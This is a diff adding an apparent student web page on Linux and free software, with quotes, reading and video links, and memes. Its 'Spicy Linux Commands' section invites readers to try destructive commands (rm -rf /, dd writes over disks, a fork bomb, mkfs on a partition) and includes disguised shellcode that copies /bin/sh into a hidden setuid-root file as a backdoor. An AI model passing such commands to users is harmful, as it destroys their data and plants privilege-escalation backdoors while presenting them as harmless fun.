@@ -1,0 +1,348 @@
+<!-- 
+  Alan Constantino
+
+  The "other.html" page is the only one that contains all 3 elements and 3 attributes in the same page.
+  In the other pages, the "hidden" attribute is the only one that gets used consistently.
+
+  The elements I used that were not discussed in class are <code>, <cite>, and <kbd>.
+  The attributes I used that were not discussed in class are hidden, dir, translate.
+
+  Elements:
+  <kbd>     - Used to distinguish text as keyboard keys. (other.html)
+  <cite>    - Used to cite from whom I got my quotes from. (other.html)
+  <code>    - Used to signify to the user that this particular piece of "code" can be pasted
+              into their respective Linux terminal. (other.html)
+
+  Attributes:
+  hidden    - Used to hide certain elements from the user. Usually used with JavaScript
+              (used in the footer of all pages to hide a certain <p> element).
+  dir       - Used to inform the browser of which way the text is oriented (i.e. left-to-right
+              or right-to-left)
+  translate - Used to inform the browser whether or not to translate the particular text that
+              has this attribute.
+ -->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+    <link
+      rel="apple-touch-icon"
+      sizes="180x180"
+      href="./images/favicons/apple-touch-icon.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="32x32"
+      href="./images/favicons/favicon-32x32.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="16x16"
+      href="./images/favicons/favicon-16x16.png"
+    />
+    <link rel="manifest" href="./images/favicons/site.webmanifest" />
+    <title>Other</title>
+  </head>
+  <body id="top">
+    <!-- header -->
+    <header role="banner">
+      <nav role="navigation">
+        <ul>
+          <li><a href="./index.html" title="Why">Why</a></li>
+          <li><a href="./security.html" title="Security">Security</a></li>
+          <li>
+            <a href="./freedom.html" title="Freedom">Freedom</a>
+          </li>
+          <li class="active"><a href="./other.html" title="Other">Other</a></li>
+        </ul>
+      </nav>
+    </header>
+    <!-- main contnet -->
+    <main role="main">
+      <!-- article 1 -->
+      <article>
+        <header>
+          <h1>Resources</h1>
+          <hr />
+        </header>
+        <section>
+          <h2>Quotes</h2>
+          <figure class="quote">
+            <blockquote
+              cite="https://www.goodreads.com/author/quotes/13568270.Richard_Stallman"
+            >
+              With software there are only two possibilites: either the users
+              control the programme or the programme controls the users. If the
+              programme controls the users, and the developer controls the
+              programme, then the programme is an instrument of unjust power.
+            </blockquote>
+            <figcaption>
+              —
+              <cite>Richard Stallman</cite>
+            </figcaption>
+          </figure>
+          <figure class="quote">
+            <blockquote
+              cite="https://www.brainyquote.com/authors/richard-stallman-quotes"
+            >
+              "The idea of free software is that users of computing deserve
+              freedom. They deserve in particular to have control over their
+              computing. And proprietary software does not allow users to have
+              control of their computing."
+            </blockquote>
+            <figcaption>
+              —
+              <cite>Richard Stallman</cite>
+            </figcaption>
+          </figure>
+          <figure class="quote">
+            <blockquote
+              cite="https://www.goodreads.com/author/quotes/92867.Linus_Torvalds"
+            >
+              "The theory behind open source is simple. In the case of an
+              operating system, the source code-the programming instructions
+              underlying the system-is free. Anyone can improve it, change it,
+              exploit it. But those improvements, changes, and exploitations
+              have to be made freely available. Think Zen. The project belongs
+              to no one and to everyone. When a project is opened up, there is
+              rapid and continual improvement. With teams of contributors
+              working in parallel, the results can happen far more speedily and
+              success­ fully than if the work were being conducted behind closed
+              doors."
+            </blockquote>
+            <figcaption>
+              —
+              <cite>Linus Torvalds</cite>
+            </figcaption>
+          </figure>
+          <figure class="quote">
+            <blockquote
+              cite="https://www.brainyquote.com/authors/linus-torvalds-quotes"
+            >
+              "Microsoft isn't evil, they just make really crappy operating
+              systems."
+            </blockquote>
+            <figcaption>
+              —
+              <cite>Linus Torvalds</cite>
+            </figcaption>
+          </figure>
+          <figure class="quote">
+            <blockquote
+              cite="https://www.brainyquote.com/quotes/linus_torvalds_587384"
+            >
+              "In real open source, you have the right to control your own
+              destiny."
+            </blockquote>
+            <figcaption>
+              —
+              <cite>Linus Torvalds</cite>
+            </figcaption>
+          </figure>
+        </section>
+        <section>
+          <h2>Reading</h2>
+          <ul>
+            <li>
+              <a
+                href="https://www.gnu.org/philosophy/philosophy.html"
+                target="_blank"
+                title="Philosophy of the GNU Project"
+                >The philosophy of Free Software and the GNU Project</a
+              >
+            </li>
+            <li>
+              <a
+                href="https://www.gnu.org/gnu/manifesto.en.html"
+                target="_blank"
+                title="The GNU Manifesto"
+                >The GNU Manifesto</a
+              >
+            </li>
+            <li>
+              <a
+                href="https://en.wikipedia.org/wiki/List_of_Linux_distributions"
+                target="_blank"
+                title="List of Linux distributions"
+                >List of Linux distributions</a
+              >
+            </li>
+            <li>
+              <a
+                href="https://medium.com/swlh/why-you-must-use-linux-dddf7cabb266"
+                target="_blank"
+                title="Why You Must Use Linux"
+                >Why You Must Use Linux</a
+              >
+            </li>
+          </ul>
+        </section>
+        <section>
+          <h2>Videos</h2>
+          <ul>
+            <li>
+              <a
+                href="https://www.youtube.com/watch?v=btHano6wHgA"
+                target="_blank"
+                title="Why Use Free Software?"
+                >Why Use Free Software?</a
+              >
+              (Luke Smith Youtube Channel)
+            </li>
+            <li>
+              <a
+                href="https://www.youtube.com/watch?v=o8NPllzkFhE"
+                target="_blank"
+                title="The mind behind Linux | Linus Torvalds"
+                >The mind behind Linux | Linux Torvalds</a
+              >
+              (TED Youtube Channel)
+            </li>
+            <li>
+              <a
+                href="https://www.youtube.com/watch?v=vjMZssWMweA"
+                target="_blank"
+                title="History of Gnu, Linux, Free and Open Source Software (Revolution OS)"
+                >History of Gnu, Linux, Free and Open Source Software
+                (Revolution OS)</a
+              >
+              (Linux4UnMe Youtube Channel)
+            </li>
+            <li>
+              <a
+                href="https://www.youtube.com/watch?v=n9YDz-Iwgyw"
+                target="_blank"
+                title="Reclaim your freedom with free libre software now - Richard Stallman of Free Software Movement"
+                >Reclaim your freedom with free libre software now - Richard
+                Stallman of Free Software Movement</a
+              >
+              (Web Summit Youtube Channel)
+            </li>
+            <li>
+              <a
+                href="https://www.youtube.com/watch?v=jUibaPTXSHk"
+                target="_blank"
+                title="Reclaim your freedom with free libre software now - Richard Stallman of Free Software Movement"
+                >Richard Stallman Explains Everything</a
+              >
+              (David Pakman Youtube Channel)
+            </li>
+          </ul>
+        </section>
+      </article>
+      <!-- article 2 -->
+      <article>
+        <header>
+          <h1>Spicy Linux Commands</h1>
+          <hr />
+        </header>
+        <section>
+          <p>
+            I AM NOT RESPONSIBLE FOR WHAT HAPPENS IF YOU DECIDE TO RUN THESE
+            <em>SUPER SPICY COMMANDS</em> ON YOUR SYSTEM...
+          </p>
+          <p>
+            But if you want to know what these commands do, I guess you'll just
+            have to try them out for yourself :)
+          </p>
+          <p>
+            <em
+              >To interrupt the execution of a command, you can do
+              <kbd>CTRL</kbd>&plus;<kbd>C</kbd></em
+            >.
+          </p>
+          <code dir="ltr">rm -rf /</code>
+          <code dir="ltr">dd if=/dev/zero of=/dev/hda </code>
+          <code dir="ltr">:(){ :|: & };:</code>
+          <code dir="ltr">mv /home/user/* /dev/null</code>
+          <code dir="ltr">dd if=/dev/random of=/dev/sda</code>
+          <code dir="ltr">ls -la > /dev/hda</code>
+          <code dir="ltr"
+            >char esp[] __attribute__ ((section(“.text”))) /* e.s.p release */ =
+            “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68”
+            “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99”
+            “\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7”
+            “\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56”
+            “\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31”
+            “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”
+            “\x6e\x2f\x73\x68\x00\x2d\x63\x00” “cp -p /bin/sh /tmp/.beyond;
+            chmod 4755 /tmp/.beyond;”;</code
+          >
+          <code dir="ltr">mkfs.ext4 /dev/sda1</code>
+          <code dir="ltr">ls -lah > /dev/sda</code>
+          <code dir="ltr">mv ~ /dev/null</code>
+        </section>
+      </article>
+      <!-- article 3 -->
+      <article>
+        <header>
+          <h1>Spicy Memes</h1>
+          <hr />
+        </header>
+        <section>
+          <iframe
+            width="560"
+            height="315"
+            src="https://www.youtube-nocookie.com/embed/LGpH_aYBvqY"
+            title="YouTube video player"
+            frameborder="0"
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+            allowfullscreen
+          ></iframe>
+          <iframe
+            width="560"
+            height="315"
+            src="https://www.youtube-nocookie.com/embed/hbhoAr8GV98"
+            title="YouTube video player"
+            frameborder="0"
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+            allowfullscreen
+          ></iframe>
+          <iframe
+            width="560"
+            height="315"
+            src="https://www.youtube-nocookie.com/embed/eb0hUjewRgE"
+            title="YouTube video player"
+            frameborder="0"
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+            allowfullscreen
+          ></iframe>
+          <figure>
+            <img
+              src="./images/sudo-rm-rf.jpg"
+              alt="Running 'rm -rf' command Meme"
+            />
+          </figure>
+          <figure>
+            <img src="./images/arch-user.png" alt="Arch User Meme" />
+          </figure>
+          <figure>
+            <img
+              src="./images/arch-linux-install-email.jpg"
+              alt="Installing Arch Meme"
+            />
+          </figure>
+        </section>
+      </article>
+    </main>
+    <!-- footer -->
+    <footer role="contentinfo">
+      <p>
+        <a
+          href="./images/arch-meme.jpg"
+          target="_blank"
+          title="I use Arch meme"
+        >
+          I use Arch btw.
+        </a>
+      </p>
+      <p hidden dir="rtl" translate="no">رسالة مخفية فائقة السرية.</p>
+      <p><a href="#top">&#x2191; Back to Top &#x2191;</a></p>
+    </footer>
+  </body>
+</html>
